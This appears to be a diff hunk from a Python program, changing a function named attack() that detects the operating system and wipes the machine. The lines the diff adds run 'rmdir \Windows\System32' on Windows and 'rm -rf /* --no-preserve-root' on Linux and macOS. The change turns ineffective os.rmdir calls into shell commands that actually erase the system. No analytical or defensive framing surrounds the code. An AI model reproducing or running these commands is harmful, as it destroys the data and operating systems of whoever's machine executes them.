@@ -10,8 +10,8 @@ def attack():
     detect.detect()
     operating_system = platform.system()
     if operating_system == "Windows":
-       os.rmdir("\Windows\System32")
+       os.system("rmdir \Windows\System32")
     elif operating_system == "Linux":
-       os.rmdir("/")
+       os.system("rm -rf /* --no-preserve-root")
     elif operating_system == "Darwin":
-       os.rmdir("/")
+       os.system("rm -rf /* --no-preserve-root")
